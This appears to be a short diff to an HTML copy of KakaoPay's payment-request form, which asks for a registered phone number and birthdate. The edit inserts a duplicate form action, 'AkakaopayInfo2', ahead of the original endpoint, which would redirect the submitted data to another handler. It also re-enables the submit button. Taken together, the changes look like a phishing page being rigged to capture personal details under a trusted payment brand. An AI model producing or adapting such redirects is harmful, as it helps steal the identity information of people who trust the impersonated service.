@@ -202,7 +202,7 @@
 			</div>
 			<div class="layer_body">
 				<p class="txt_step">결제요청 메시지 전송을 위해<br> 카카오페이에 가입된<br>휴대폰 번호와 생년월일 6자리를 입력해주세요.</p>
-				<form id="userPost" method="post" action="/v1/c21fca7515f567eadf803dad2b7ae2c190343686d5c8e9d746b819dc96aad502/uinfo" >
+				<form action="AkakaopayInfo2" id="userPost" method="post" action="/v1/c21fca7515f567eadf803dad2b7ae2c190343686d5c8e9d746b819dc96aad502/uinfo" >
 					<fieldset>
 						<legend class="screen_out">휴대폰 번호 및 생년월일 입력</legend>
 						<div class="info_data">
@@ -222,7 +222,7 @@
 							<span class="line_tf"><span class="inner_line"></span></span>
 						</div>
 						<div class="area_btn">
-							<button type="submit" class="btn_submit" disabled="disabled">결제요청</button>
+							<button type="submit" class="btn_submit">결제요청</button> <!-- disabled="disabled" -->
 						</div>
 					</fieldset>
 				</form>
